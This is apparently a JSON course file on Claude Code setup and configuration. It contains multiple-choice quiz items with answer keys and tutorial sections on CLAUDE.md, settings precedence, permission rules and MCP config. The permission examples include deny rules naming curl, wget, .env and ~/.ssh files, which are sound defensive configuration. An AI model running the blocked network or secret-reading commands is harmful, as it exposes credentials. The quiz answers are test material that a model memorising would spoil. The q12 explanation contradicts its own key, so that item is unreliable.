    "explanation": "The content says: 'WSL2/SSH/container login: if the browser can't reach the localhost callback, paste the login code at the `Paste code here if prompted` prompt.' It also describes `claude setup-token` as producing a one-year token for headless/CI use that can be set as `CLAUDE_CODE_OAUTH_TOKEN`. WSL 1 (distractor 2) is specifically called out as NOT supporting sandboxing; the content standardizes on WSL 2, and switching to WSL 1 does not fix the localhost issue. Setting `ANTHROPIC_API_KEY` (distractor 4) works for Console/API paths but is not 'the' fix for OAuth on WSL 2, and OAuth IS supported in WSL 2. The `/logout`+`/login` retry (distractor 5) is listed as a way to switch accounts, not as a fix for the localhost callback problem."
   },
   {
    "id": "stage-0-q9",
    "type": "multiple-choice",
    "prompt": "An Enterprise org deploys Claude Code to Linux desktops and also uses Windows workstations with WSL 2. They write a Windows Registry managed policy under `HKLM\\SOFTWARE\\Policies\\ClaudeCode`. The Linux and WSL 2 machines ignore it. What is the correct way to also cover those machines?",
    "options": [
     "Deploy `/etc/claude-code/managed-settings.json` on Linux/WSL and, for WSL to inherit Windows policy, set `wslInheritsWindowsSettings: true` in a Windows managed source.",
     "Copy the registry values into `~/.claude/settings.json` on each Linux machine — user settings are the fallback on non-Windows platforms.",
     "Use server-managed settings from the Claude.ai admin console; they override file and registry sources on all platforms.",
     "The plist mechanism covers all platforms; create `com.anthropic.claudecode.plist` entries on Linux as well."
    ],
    "correct": 0,
    "explanation": "The content describes the Linux/WSL file path as `/etc/claude-code/managed-settings.json` and states: 'WSL ignores Windows policy by default (reads only `/etc/claude-code`). Set `wslInheritsWindowsSettings: true` in a Windows source to inherit.' User `~/.claude/settings.json` (distractor 2) is not a managed source — it can be overridden by users. Server-managed (distractor 3) only reaches Teams/Enterprise via Claude.ai but does not make the Windows registry policy flow to Linux. Plist (distractor 4) is a macOS mechanism only."
   },
   {
    "id": "stage-0-q10",
    "type": "multiple-choice",
    "prompt": "A dev on the team adds a `permissions.allow` entry in their local `~/.claude/settings.json` for a tool that the Enterprise managed settings also lists in `permissions.allow`. A different dev tries to remove a `permissions.deny` entry that managed settings enforces, by overriding it in their project `.claude/settings.json`. What actually happens in each case?",
    "options": [
     "The first dev's local allow is additive (extends the managed list); the second dev's local deny removal has no effect — managed denies cannot be removed locally.",
     "Both local changes are ignored entirely — managed settings replace all local config, with no merging.",
     "The first dev's allow overrides the managed allow (last-write wins); the second dev's deny removal succeeds because project settings outrank user settings.",
     "Local settings can extend managed allows but also override managed denies, so both changes take effect."
    ],
    "correct": 0,
    "explanation": "The content states: 'Array settings merge across all sources: developers can extend but not remove managed `permissions.allow`/`permissions.deny` entries — a managed deny can't be overridden locally.' So local adds are additive, but local removals of managed denies are blocked. Distractor 2 incorrectly says managed settings completely replace local config (they don't — arrays merge). Distractor 3 incorrectly says local overrides managed (managed always wins on denies). Distractor 4 correctly states extends but incorrectly allows local override of managed denies."
   },
   {
    "id": "stage-0-q11",
    "type": "multiple-choice",
    "prompt": "A team uses rotating API keys from a secrets vault. They configure `apiKeyHelper` as a shell script that calls the vault API. The script takes about 15 seconds to return. What behavior will users observe?",
    "options": [
     "Every session will show a warning and experience a slowdown, because `apiKeyHelper` scripts taking longer than 10 seconds trigger a warning and slow every session.",
     "The helper will only be called once per day (TTL default is 24 hours), so the delay has negligible impact.",
     "Claude Code will fall back to `ANTHROPIC_API_KEY` if `apiKeyHelper` takes more than 10 seconds.",
     "The script runs in the background and users see no delay — they just proceed while the key is fetched asynchronously."
    ],
    "correct": 0,
    "explanation": "The content states: 'A helper >10s shows a warning and slows every session.' The default TTL is 5 minutes (not 24 hours), so the helper is called frequently (distractor 2 is wrong). There is no fallback to `ANTHROPIC_API_KEY` on timeout (distractor 3). The helper blocks the session — it does not run asynchronously (distractor 4)."
   },
   {
    "id": "stage-0-q12",
    "type": "multiple-choice",
    "prompt": "Your org is on Claude for Teams (not Enterprise). You want to enforce a specific Claude Code version range org-wide via managed settings. Which delivery mechanism is available to you?",
    "options": [
     "Server-managed settings pushed from the Claude.ai admin console — Teams includes server-managed settings delivery.",
     "The macOS plist (`com.anthropic.claudecode`) or Windows registry (`HKLM\\SOFTWARE\\Policies\\ClaudeCode`) — these work for any provider.",
     "File-based managed settings at `/etc/claude-code/managed-settings.json` or the OS equivalent — available for any provider.",
     "Both B and C are correct; server-managed settings require Enterprise."
    ],
    "correct": 0,
    "explanation": "Teams DOES have server-managed settings delivery (requires Claude Code v2.1.38+). So option A is correct — the claude.ai admin console is available to Teams admins. Options B (macOS plist / Windows registry) and C (file-based managed-settings.json) also work for Teams but are shared with non-subscription providers. D is a trap: it incorrectly claims server-managed requires Enterprise. The verified claim is 'Teams requires v2.1.38+, Enterprise requires v2.1.30+' — both tiers support it."
   },
   {
    "id": "stage-0-q13",
    "type": "multiple-choice",
    "prompt": "A CI pipeline needs to run Claude Code headlessly. The pipeline can't complete an interactive OAuth flow. Which approach does the documentation recommend for generating a CI token?",
    "options": [
     "Run `claude setup-token` on a machine that can complete OAuth; it prints a one-year token without saving it, which you then set as `CLAUDE_CODE_OAUTH_TOKEN` in CI.",
     "Set `ANTHROPIC_API_KEY` in CI — API key auth is the supported headless path and no setup step is needed.",
     "Use `apiKeyHelper` pointing to a CI secret store; it is called automatically in headless mode.",
     "Run `/login` in CI and pipe the OAuth URL to a headless browser to complete the flow."
    ],
    "correct": 0,
    "explanation": "The content states: '`claude setup-token` walks OAuth, prints a one-year token (does not save it) → set `CLAUDE_CODE_OAUTH_TOKEN`. Requires Pro/Max/Team/Enterprise; inference-only; cannot establish Remote Control. Do not rely on interactive `/login`.' Using `ANTHROPIC_API_KEY` (distractor 2) is valid for Console/API plans, but the content explicitly recommends `claude setup-token` for subscription plans in CI. `apiKeyHelper` (distractor 3) is for rotating keys, not for establishing CI OAuth sessions. Running `/login` in CI (distractor 4) is explicitly warned against."
   },
   {
    "id": "stage-0-q14",
    "type": "multi-select",
    "prompt": "Which of the following statements about managed settings precedence and enforcement are TRUE? (Select all that apply.)",
    "options": [
     "Server-managed settings (from the Claude.ai admin console) have the highest priority among all four managed sources.",
     "The Windows user registry key (`HKCU\\SOFTWARE\\Policies\\ClaudeCode`) is writable without elevation and is therefore not an enforcement boundary.",
     "Managed settings completely replace user and project settings — no local config is ever merged or additive.",
     "Running `/status` will show which managed setting source is active (e.g., remote, plist, HKLM, or file).",
     "Plist and registry sources require Teams/Enterprise; file-based managed settings work for any provider."
    ],
    "correct": [
     0,
     1,
     3
    ],
    "explanation": "A: Correct — the table lists server-managed as 'Priority 1 (highest)'. B: Correct — the content explicitly calls out HKCU as 'writable without elevation — not an enforcement boundary.' C: False — array settings (permissions.allow/deny) MERGE additively; local settings can extend managed ones. D: Correct — '/status' shows 'Setting sources' including 'Enterprise managed settings' + source label. E: False — plist/registry are available for 'Any provider'; only server-managed requires Teams/Enterprise."
   }
  ],
  "masteryCheckpoint": "You can explain the concepts of Setup & onboarding."
 },
 {
  "id": "stage-1",
  "stage": 1,
  "title": "Config & memory (CLAUDE.md, settings)",
  "summary": "Config & memory (CLAUDE.md, settings): CLAUDE.md memory files, guidance vs enforcement, settings precedence and merging.",
  "prerequisites": [
   "stage-0"
  ],
  "objectives": [
   "Understand the concepts in Config & memory (CLAUDE.md, settings)."
  ],
  "definitions": [
   {
    "term": "CLAUDE.md memory files",
    "short": "Markdown instruction files loaded into every session's context to give Claude persistent guidance, discovered by walking up the directory tree with more-specific files winning on conflict."
   },
   {
    "term": "guidance vs enforcement",
    "short": "CLAUDE.md and rules are non-binding advice injected as context with no compliance guarantee, so anything that must never happen requires permissions, hooks, or managed settings instead."
   },
   {
    "term": "settings precedence and merging",
    "short": "Config layers (user < project < local < CLI/env < managed) combine by merging arrays across all scopes while scalars take the most-specific value, with managed settings always winning."
   },
   {
    "term": "committed vs personal config scope",
    "short": "Each config artifact has a deliberate home — source-controlled for shared team config, gitignored or user-level for personal/secret state that must never be committed."
   },
   {
    "term": "permission rules",
    "short": "Tool(pattern) allow/deny/ask entries that merge across scopes where deny always beats allow, matching commands literally rather than by semantics or executable."
   },
   {
    "term": "CLAUDE.md authoring discipline",
    "short": "Keep instruction files short (~200 lines), concrete, and verifiable because length and vagueness reduce adherence even though the file always loads in full."
   }
  ],
  "sections": [
   {
    "heading": "The mental model: context vs enforcement",
    "body": "Before touching a single config file, align on a distinction that trips up nearly every team deploying Claude Code at scale: **CLAUDE.md gives Claude advice; settings give the runtime rules**.\n\nClaude reads CLAUDE.md the way a new employee reads a team wiki — with good faith intent, but no contractual obligation and no guarantee of strict compliance. The official docs are explicit: \"CLAUDE.md content is delivered as a user message after the system prompt, not as part of the system prompt itself. Claude reads it and tries to follow it, but there's no guarantee of strict compliance, especially for vague or conflicting instructions.\"\n\nSettings.json, by contrast, is enforced by the **Claude Code client process** before the model is ever consulted. A `deny` rule in settings.json means the tool call never reaches the model. A hook in settings is a shell command the runtime executes. Neither depends on Claude deciding to comply.\n\nThe docs reinforce this: \"Permission rules are enforced by Claude Code, not by the model. Instructions in your prompt or CLAUDE.md shape what Claude tries to do, but they don't change what Claude Code allows.\"\n\nThis distinction determines where every team policy should live:\n\n| What you want | Use |\n|---|---|\n| \"Claude should prefer 2-space indentation\" | CLAUDE.md |\n| \"Claude must never run `git push --force`\" | `permissions.deny` in settings.json |\n| \"Always run `make lint` before committing\" | PreCommit hook in settings.json |\n| \"Don't touch `.env` files\" | `Read(./.env)` deny rule in settings.json |\n| \"Remind Claude about our API conventions\" | CLAUDE.md (or a path-scoped rule) |\n| \"Never use `bypassPermissions` mode\" | `permissions.disableBypassPermissionsMode: \"disable\"` in settings |\n\nDesigning a team setup means deciding, for each concern, which layer owns it. The rest of this stage is the mechanics of each layer."
   },
   {
    "heading": "CLAUDE.md file discovery and load order",
    "body": "Claude Code discovers CLAUDE.md files by **walking up the directory tree** from the working directory, loading every `CLAUDE.md` and `CLAUDE.local.md` it finds. For a session launched in `~/projects/acme/services/billing/`, Claude loads:\n\n1. `~/projects/acme/services/billing/CLAUDE.md` (and `.local.md`)\n2. `~/projects/acme/services/CLAUDE.md`\n3. `~/projects/acme/CLAUDE.md`\n4. `~/projects/CLAUDE.md`\n5. `~/.claude/CLAUDE.md` (user-level)\n\nOrganization-managed files at the system policy location are also loaded (see the scope table below).\n\nAll discovered files are **concatenated, not overridden**. The load order across the directory tree is from the filesystem root down to your working directory — the file closest to your working directory is read last. Within a directory, `CLAUDE.local.md` is appended after `CLAUDE.md`.\n\nFiles in **subdirectories below** the working directory are not loaded at launch; they load on demand when Claude reads files in those subdirectories.\n\n### Full scope table\n\n| Scope | Location | Source-controlled | Who it applies to |\n|---|---|---|---|\n| Managed policy | macOS: `/Library/Application Support/ClaudeCode/CLAUDE.md`; Linux/WSL: `/etc/claude-code/CLAUDE.md`; Windows: `C:\\Program Files\\ClaudeCode\\CLAUDE.md` | IT-deployed | All users on machine |\n| User | `~/.claude/CLAUDE.md` | Personal; not shared | You, across all projects |\n| Project | `./CLAUDE.md` or `./.claude/CLAUDE.md` | Yes, committed to git | Whole team |\n| Local | `./CLAUDE.local.md` | No (gitignored) | You, in this project only |\n\n### What survives context compaction\n\nAfter `/compact`, the project-root CLAUDE.md is re-read from disk and re-injected. Nested CLAUDE.md files in subdirectories are **not** automatically re-injected — they reload the next time Claude reads a file in that subdirectory. Instructions you gave only in conversation are lost. The implication: anything important enough to survive long sessions must be in CLAUDE.md, not in chat.\n\n### Excluding CLAUDE.md files in monorepos\n\nIn large monorepos, ancestor CLAUDE.md files from other teams may be picked up automatically. The `claudeMdExcludes` setting lets you skip specific files by path or glob:\n\n```json\n// .claude/settings.local.json\n{\n  \"claudeMdExcludes\": [\n    \"**/other-team/CLAUDE.md\",\n    \"/home/user/monorepo/infra/.claude/rules/**\"\n  ]\n}\n```\n\nPatterns match against absolute file paths. `claudeMdExcludes` can be set at any scope (user, project, local, or managed) and arrays merge across scopes. Managed policy CLAUDE.md files cannot be excluded."
   },
   {
    "heading": "Authoring discipline: keeping CLAUDE.md effective",
    "body": "The most common mistake teams make is treating CLAUDE.md as a dumping ground. Long, vague, or contradictory files reduce adherence — not because Claude ignores them, but because longer context dilutes salience and vague instructions leave more room for misinterpretation.\n\n### Size target: under 200 lines per file\n\nCLAUDE.md files load into the context window on every session, consuming tokens alongside your conversation. The official guidance targets under 200 lines per file. Beyond that, adherence measurably degrades and context cost compounds. Splitting into `@path` imports helps with organization but does **not** reduce context cost — imported files load at launch the same as if pasted inline.\n\n### Write verifiable instructions\n\nEvery instruction should be concrete enough that you could write a test for it:\n\n```markdown\n# Bad (unverifiable)\nFormat code properly. Test your changes. Keep files organized.\n\n# Good (verifiable)\n- Use 2-space indentation in all TypeScript files\n- Run `npm test` before committing — check exit code, not just output\n- API handlers live in `src/api/handlers/`; middleware in `src/middleware/`\n- Never `console.log` in production code; use `logger.info()` from `src/lib/logger.ts`\n```\n\n### Use structure, not prose\n\nHeaders and bullets work better than paragraphs. Claude scans structure the way a reader does — organized sections are easier to locate and apply than dense text blocks.\n\n### What to put in CLAUDE.md vs elsewhere\n\n| Content type | Put it in |\n|---|---|\n| Build and test commands | Project CLAUDE.md |\n| Coding style conventions | Project CLAUDE.md |\n| Architectural decisions | Project CLAUDE.md |\n| Multi-step procedures (e.g., deploy runbook) | `.claude/skills/` (loads on demand) |\n| File-type-specific rules | `.claude/rules/api-design.md` with `paths:` frontmatter |\n| Personal sandbox URLs, test data | CLAUDE.local.md |\n| Cross-project personal preferences | `~/.claude/CLAUDE.md` |\n| Anything that must be enforced | settings.json, not CLAUDE.md |\n\n### HTML comments for maintainer notes\n\nBlock-level HTML comments in CLAUDE.md are stripped before the file is injected into context:\n\n```markdown\n<!-- Last audited 2026-06-01 by @alice — remove the PA exception when Stage 5 ships -->\n- Every `@t{}` reference must resolve to a prerequisite-or-equal concept.\n```\n\nThe comment is visible when you open the file directly (or via the Read tool), but costs no context tokens in sessions. Comments inside code blocks are preserved.\n\n### Look for conflicting instructions\n\nIf two CLAUDE.md files give different guidance for the same behavior, Claude may pick one arbitrarily. Review your project CLAUDE.md, nested subdirectory CLAUDE.md files, and `.claude/rules/` periodically to remove outdated or contradictory entries."
   },
   {
    "heading": "Imports and path-scoped rules",
    "body": "Two mechanisms let you organize CLAUDE.md content without putting everything in one file. They have fundamentally different loading behavior.\n\n## `@path` imports — inline at launch\n\nThe `@path/to/file` syntax inlines another file's full contents at the point of the import, at session launch:\n\n```markdown\n# CLAUDE.md\nSee @README.md for project overview.\nAll npm commands: @package.json\n\n# Git workflow\n@docs/git-workflow.md\n\n# Code conventions\n@.claude/conventions.md\n```\n\n**Critical caveat**: imports do not save context. The imported file's full content enters the context window exactly as if you had pasted it inline. A 500-line imported file is a 500-line context cost every session. Use imports for organization, not for conditional loading.\n\nRelative paths resolve relative to the **importing file** (not the working directory). Imports can chain up to four hops deep. Wrapping a path in backticks (`` `@README` ``) prevents expansion — the literal text is kept.\n\nThe first time Claude Code encounters imports from outside the project, it shows an approval dialog. If declined, the imports stay disabled for that path.\n\n## `.claude/rules/` — topic-scoped files\n\nThe `.claude/rules/` directory lets you split instructions into separate markdown files, discovered recursively:\n\n```\n.claude/\n  rules/\n    testing.md          # loads every session (no frontmatter)\n    api-design.md       # loads every session\n    frontend/\n      react-patterns.md # loads every session\n      css-conventions.md\n```\n\nFiles without `paths:` frontmatter load at launch with the same priority as `.claude/CLAUDE.md`. Files **with** `paths:` frontmatter are deferred — they only enter context when Claude reads a file matching the pattern.\n\n## Path-scoped rules — the real context win\n\n```markdown\n---\npaths:\n  - \"src/api/**/*.ts\"\n  - \"src/api/**/*.test.ts\"\n---\n\n# API Development Rules\n\n- All endpoints must validate input with Zod before touching business logic\n- Error responses must use the standard `{ error: string; code: string }` shape\n- Include JSDoc `@openapi` annotations on every route handler\n- Never return raw database error messages to the client\n```\n\nThis file sits in `.claude/rules/api-rules.md` and contributes **zero tokens** to sessions where Claude never touches a file matching `src/api/**/*.ts`. For a large codebase with distinct frontend, backend, and infrastructure concerns, path-scoped rules can cut effective CLAUDE.md context cost substantially.\n\nPath-scoped rules trigger when Claude reads files matching the pattern, not on every tool use.\n\n### Supported glob patterns\n\n| Pattern | Matches |\n|---|---|\n| `**/*.ts` | All TypeScript files at any depth |\n| `src/**/*` | All files under `src/` |\n| `*.md` | Markdown at project root only |\n| `src/**/*.{ts,tsx}` | TS and TSX anywhere under `src/` |\n| `src/components/*.tsx` | React components in a specific directory |\n\nYou can specify multiple patterns and use brace expansion to match multiple extensions in one pattern:\n\n```markdown\n---\npaths:\n  - \"src/**/*.{ts,tsx}\"\n  - \"lib/**/*.ts\"\n  - \"tests/**/*.test.ts\"\n---\n```\n\n### Sharing rules across projects with symlinks\n\nThe `.claude/rules/` directory supports symlinks. Symlinks are resolved and loaded normally, and circular symlinks are detected and handled gracefully:\n\n```bash\nln -s ~/shared-claude-rules .claude/rules/shared\nln -s ~/company-standards/security.md .claude/rules/security.md\n```"
   },
   {
    "heading": "Settings files: locations, precedence, and merging",
    "body": "Claude Code has five configuration layers. Understanding how they combine is essential before you write a single line of settings.\n\n## The five layers (highest to lowest priority)\n\n| Layer | File location | Shared | Overridable |\n|---|---|---|---|\n| **Managed** | Linux/WSL: `/etc/claude-code/managed-settings.json`; macOS: `/Library/Application Support/ClaudeCode/managed-settings.json`; Windows: `C:\\Program Files\\ClaudeCode\\managed-settings.json` | IT-deployed | Never |\n| **CLI args** | `--flag` args on the `claude` command | N/A | Overrides user/project/local, but NOT managed |\n| **Local** | `.claude/settings.local.json` (gitignored) | No | Overrides project |\n| **Project** | `.claude/settings.json` (committed) | Yes | Overrides user |\n| **User** | `~/.claude/settings.json` | No | Base defaults |\n\n**Important**: managed settings cannot be overridden by command-line arguments. CLI args are second-highest priority but remain subordinate to managed policy.\n\n## How values merge\n\nThe merging rules differ by value type:\n\n- **Scalars** (strings, booleans, numbers): the most-specific (highest-priority) scope wins.\n- **Arrays**: **concatenated and deduplicated** across all scopes. If user settings have `[\"Bash(npm *)\"]` in `permissions.allow` and project settings have `[\"Bash(git *)\"]`, the effective allow list contains both entries. This means every scope can **add** restrictions but no scope can remove a restriction set at a higher level.\n- **Objects**: deep merge, with scalar fields inside the object following scalar rules.\n\n## Minimal project settings starter\n\n```json\n// .claude/settings.json  (committed to git)\n{\n  \"$schema\": \"https://json.schemastore.org/claude-code-settings.json\",\n  \"permissions\": {\n    \"allow\": [\n      \"Bash(npm run *)\",\n      \"Bash(git status)\",\n      \"Bash(git diff *)\",\n      \"Bash(git log *)\",\n      \"Bash(git add *)\",\n      \"Bash(git commit *)\"\n    ],\n    \"deny\": [\n      \"Bash(git push --force *)\",\n      \"Read(./.env)\",\n      \"Read(./.env.*)\",\n      \"Read(./secrets/**)\"\n    ]\n  },\n  \"hooks\": {\n    \"PreCommit\": \"bash .claude/hooks/pre-commit.sh\"\n  }\n}\n```\n\n```json\n// .claude/settings.local.json  (gitignored — personal overrides)\n{\n  \"model\": \"claude-opus-4-5\",\n  \"autoMemoryEnabled\": false\n}\n```\n\n## Hot-reload vs requires restart\n\nSome settings apply immediately when the file changes on disk; others require restarting the session:\n\n| Setting | Hot-reloads? |\n|---|---|\n| `permissions` | Yes |\n| `hooks` | Yes |\n| Credential helpers (`apiKeyHelper`, etc.) | Yes |\n| `model` | No — use `/model` to switch mid-session |\n| `outputStyle` | No — rebuilt on `/clear` or restart |\n\nClaude Code also fires a `ConfigChange` hook whenever a settings file changes on disk, letting you react to configuration changes in scripts."
   },
   {
    "heading": "Committed vs personal config scope",
    "body": "Every config artifact has a deliberate home. Getting this wrong causes two classes of problems: secrets committed to version control, and personal preferences that clobber teammates' setups.\n\n## Decision table\n\n| Artifact | Correct home | Why |\n|---|---|---|\n| Team permission rules (`allow`/`deny`) | `.claude/settings.json` (committed) | All developers need the same guardrails |\n| Shared MCP servers (e.g., internal Postgres tool) | `.mcp.json` (committed) | Team needs the same servers |\n| Coding standards, build commands | `CLAUDE.md` (committed) | Session context for all devs |\n| Personal model preference | `.claude/settings.local.json` (gitignored) | Individual choice |\n| Personal sandbox URL, local test DB | `CLAUDE.local.md` (gitignored) | Machine-specific, may contain credentials |\n| Personal MCP server not used by team | `~/.claude.json` (user-level, never committed) | Stored under project path inside that file; crosses project boundaries via user scope |\n| API keys, tokens, secrets | **Never in settings files** — use shell env or secret manager | Secrets must not be in any committed file |\n| Organization policy | `/etc/claude-code/managed-settings.json` (MDM-deployed) | Can't be overridden; not in repo |\n\n## Gitignore discipline\n\nYour project `.gitignore` should explicitly exclude:\n\n```\n# .gitignore\n.claude/settings.local.json\nCLAUDE.local.md\n```\n\nRunning `/init` and choosing the personal option adds these automatically. Without this, a developer with personal API keys or local paths in their local settings will accidentally commit them.\n\n## Cross-worktree personal instructions\n\n`CLAUDE.local.md` is gitignored and exists only in the worktree where you created it. If you use multiple git worktrees of the same repository, import from your home directory instead:\n\n```markdown\n# CLAUDE.local.md\n@~/.claude/my-project-prefs.md\n```\n\nThis file in `~/.claude/my-project-prefs.md` is personal, never committed, and shared across worktrees.\n\n## MCP scope naming note\n\nMCP server scopes use terminology that differs from general settings scopes:\n\n| MCP scope name | What it means | Stored in |\n|---|---|---|\n| `local` (default) | Personal, current project only | `~/.claude.json` (under that project's path) |\n| `project` | Shared with team | `.mcp.json` at project root |\n| `user` | Personal, all projects | `~/.claude.json` (global section) |\n\nNote that MCP \"local\" scope is stored in your home directory (`~/.claude.json`), not in the project directory — unlike general local settings which use `.claude/settings.local.json`."
   },
   {
    "heading": "Permission rules: syntax, evaluation order, and common patterns",
    "body": "Permission rules are the primary enforcement mechanism for a shared dev environment. They are enforced by the Claude Code client process — not by the model — so they hold regardless of what Claude decides to do.\n\n## Syntax: `Tool(specifier)`\n\nEvery permission rule follows the format `Tool` or `Tool(specifier)`:\n\n```json\n{\n  \"permissions\": {\n    \"allow\": [\n      \"Bash(npm run test *)\",\n      \"Bash(git commit *)\",\n      \"Read(~/.zshrc)\",\n      \"WebFetch(domain:docs.example.com)\"\n    ],\n    \"deny\": [\n      \"Bash(git push --force *)\",\n      \"Bash(curl *)\",\n      \"Read(./.env)\",\n      \"Read(./.env.*)\",\n      \"Read(./secrets/**)\",\n      \"mcp__*\"\n    ],\n    \"ask\": [\n      \"Write(src/**)\"\n    ]\n  }\n}\n```\n\n## Evaluation order: deny beats ask beats allow\n\nRules are evaluated in order: **deny first, then ask, then allow**. Specificity does not change this order. A broad deny like `Bash(aws *)` blocks every call matching `aws *`, including calls that also match a narrower allow like `Bash(aws s3 ls)`. There are no allowlist exceptions inside a deny rule — deny always wins unconditionally.\n\nThe same precedence extends across scopes: if a tool is denied at any settings level (managed, user, project, or local), no other level can allow it.\n\n## Wildcard mechanics for Bash rules\n\nBash rules support `*` as a glob wildcard. A single `*` matches any sequence of characters including spaces, so one wildcard can span multiple arguments.\n\n- Space before `*` enforces a word boundary: `Bash(ls *)` matches `ls -la` but not `lsof`, while `Bash(ls*)` matches both\n- `Bash(git * main)` matches `git checkout main`, `git push origin main`, and `git log --oneline main`\n- The `:*` suffix is an equivalent trailing wildcard: `Bash(ls:*)` matches the same commands as `Bash(ls *)`\n\n**Important**: `*` in Read/Edit/Write path rules follows gitignore semantics, where `*` matches within a single path segment only and `**` matches across directory separators.\n\n```json\n// Allow npm and git reads; deny network and force-push\n\"allow\": [\n  \"Bash(npm run *)\",\n  \"Bash(npm install *)\",\n  \"Bash(git status)\",\n  \"Bash(git diff *)\",\n  \"Bash(git log *)\",\n  \"Bash(git add *)\",\n  \"Bash(git commit *)\"\n],\n\"deny\": [\n  \"Bash(git push --force *)\",\n  \"Bash(curl *)\",\n  \"Bash(wget *)\"\n]\n```\n\n## Tool-name patterns\n\n- `Bash` (no parens) removes Bash from Claude's context entirely — Claude never sees the tool\n- `Bash(*)` is equivalent to `Bash` and also removes the tool from context as a deny rule\n- `Bash(rm *)` leaves Bash available but blocks matching calls when attempted\n- `mcp__*` as a deny rule removes all MCP tools from Claude's context\n- `mcp__puppeteer__*` as an allow rule approves all tools from the `puppeteer` server\n- Allow rules accept tool-name globs **only** after a literal `mcp__<server>__` prefix; an allow rule of bare `mcp__*` is skipped with a warning\n\n## Read/Write/Edit path anchoring\n\nPath patterns follow gitignore syntax with four distinct anchors:\n\n| Pattern prefix | Anchors to | Example |\n|---|---|---|\n| `//path` | Filesystem root (absolute) | `Read(//etc/passwd)` |\n| `~/path` | Home directory | `Read(~/.ssh/**)` |\n| `/path` | **Project root** (not filesystem root) | `Edit(/src/**/*.ts)` |\n| `path` or `./path` | Current directory | `Read(./.env)` |\n\n**Common gotcha**: `/Users/alice/file` inside a permission rule is **not** an absolute path — it is relative to the project root. Use `//Users/alice/file` for true absolute paths.\n\nBare filenames follow gitignore semantics and match at any depth: `Read(.env)` and `Read(**/.env)` are equivalent, matching any `.env` at or under the current directory.\n\n## WebFetch domain rules\n\n```json\n\"allow\": [\n  \"WebFetch(domain:docs.internal.example.com)\",\n  \"WebFetch(domain:*.npmjs.com)\"\n],\n\"deny\": [\n  \"WebFetch(domain:*)\"\n]\n```\n\n`WebFetch(domain:*.example.com)` matches any subdomain at any depth (e.g., `api.example.com`, `a.b.example.com`) but **not** the apex `example.com` itself. A trailing wildcard like `WebFetch(domain:example.*)` matches only one segment after the dot — `example.org` matches but `example.evil.com` does not, because `*` cannot cross a dot.\n\n## Compound commands are split, not evaluated whole\n\nBash rules check each subcommand independently. Recognized separators are `&&`, `||`, `;`, `|`, `|&`, `&`, and newlines. A rule like `Bash(safe-cmd *)` does **not** grant permission to run `safe-cmd && dangerous-cmd` — each part must independently match an allow rule.\n\n## Read/Edit deny rules do not cover subprocesses\n\nRead and Edit deny rules apply to Claude's built-in file tools and to file commands Claude Code recognizes in Bash (`cat`, `head`, `tail`, `sed`). They do **not** apply to arbitrary subprocesses — a Python or Node script that opens files itself is not governed by these rules. For OS-level enforcement that covers all processes, enable the sandbox."
   },
   {
    "heading": "Auto memory vs CLAUDE.md: when Claude writes its own notes",
    "body": "Auto memory is a machine-local, Claude-authored fact store. It is distinct from CLAUDE.md in every important dimension.\n\n## Comparison\n\n| Dimension | CLAUDE.md | Auto memory (MEMORY.md) |\n|---|---|---|\n| **Author** | Human | Claude itself |\n| **Content** | Instructions, rules, standards | Build commands Claude discovered, debugging patterns, preferences it inferred |\n| **Scope** | Project, user, or org | Per repository, shared across worktrees of the same repo |\n| **Load behavior** | Full file, every session | First 200 lines or 25KB of `MEMORY.md` at launch; topic files on demand |\n| **Persistence across machines** | Yes (committed to git) | No (machine-local) |\n| **Source of truth** | Humans decide what goes in | Claude decides what to remember |\n| **Override** | Edit the file | Ask Claude to update, or edit directly |\n\n## Storage layout\n\nEach project gets its own memory directory. The `<project>` path is derived from the git repository root, so all worktrees and subdirectories within the same repo share one directory:\n\n```\n~/.claude/projects/<project>/memory/\n  MEMORY.md            # concise index — first 200 lines or 25KB loaded every session\n  debugging.md         # detailed notes on debugging patterns (loaded on demand)\n  api-conventions.md   # inferred API design patterns\n  build-commands.md    # build/test commands Claude discovered\n```\n\nTopic files (`debugging.md`, etc.) are **not** loaded at session start. Claude reads them on demand using its file tools when it needs the information.\n\n## What Claude saves\n\nClaude decides what to save — it doesn't write on every session. Typical candidates: the exact test invocation it had to discover, a recurring import path pattern, a preference you corrected it on twice. It keeps `MEMORY.md` concise by moving details to topic files.\n\n## Controlling auto memory\n\nAuto memory requires Claude Code v2.1.59 or later. Check your version with `claude --version`.\n\n```json\n// Disable via settings\n{ \"autoMemoryEnabled\": false }\n```\n\n```bash\n# Or via environment variable\nexport CLAUDE_CODE_DISABLE_AUTO_MEMORY=1\n```\n\n```json\n// Redirect to a different directory (absolute path or ~/)\n{ \"autoMemoryDirectory\": \"~/my-custom-memory-dir\" }\n```\n\nThe `autoMemoryDirectory` setting is honored from any settings scope (user, project, local, or managed). When set in a project settings file, it is honored only after you accept the workspace trust dialog for that folder.\n\nTo inspect or audit: run `/memory` in a session. The `/memory` command lists all CLAUDE.md files loaded in the current session, lets you toggle auto memory on or off, and provides a link to open the auto memory folder. All files are plain markdown you can edit or delete at any time.\n\n## The team scenario\n\nFor a shared team repo:\n- CLAUDE.md is committed and carries official team standards\n- Auto memory is per-developer and never committed — each developer builds their own machine-local Claude notes\n- This is the intended design: team knowledge in CLAUDE.md, individual learnings in auto memory"
   },
   {
    "heading": "MCP server configuration: .mcp.json and team approval flow",
    "body": "MCP servers connect Claude Code to external tools — databases, issue trackers, monitoring dashboards, internal APIs. For team deployments, the key file is `.mcp.json` at the project root.\n\n## Three scopes of MCP configuration\n\n| Scope name | Stored in | Committed? | Applies to |\n|---|---|---|---|\n| **project** | `.mcp.json` (project root) | Yes | All team members in this repo |\n| **local** (default) | `~/.claude.json` (under that project's path) | No | You only, in this project |\n| **user** | `~/.claude.json` (global section) | No | You, across all projects |\n\nNote: the **local** MCP scope is stored in your home directory (`~/.claude.json`), not in the project — unlike `.claude/settings.local.json` which is in the project directory.\n\n## The `.mcp.json` format\n\n```json\n{\n  \"mcpServers\": {\n    \"internal-db\": {\n      \"command\": \"/usr/local/bin/db-mcp-server\",\n      \"args\": [\"--config\", \"/etc/mcp/db-config.json\"],\n      \"env\": {\n        \"DB_HOST\": \"${DB_HOST:-localhost}\",\n        \"DB_PORT\": \"${DB_PORT:-5432}\",\n        \"DB_PASSWORD\": \"${DB_PASSWORD}\"\n      }\n    },\n    \"sentry\": {\n      \"type\": \"http\",\n      \"url\": \"https://mcp.sentry.dev/mcp\"\n    },\n    \"github-api\": {\n      \"type\": \"http\",\n      \"url\": \"${GITHUB_MCP_URL:-https://api.githubcopilot.com/mcp/v1}\",\n      \"headers\": {\n        \"Authorization\": \"Bearer ${GITHUB_TOKEN}\"\n      }\n    }\n  }\n}\n```\n\nThe `type` field also 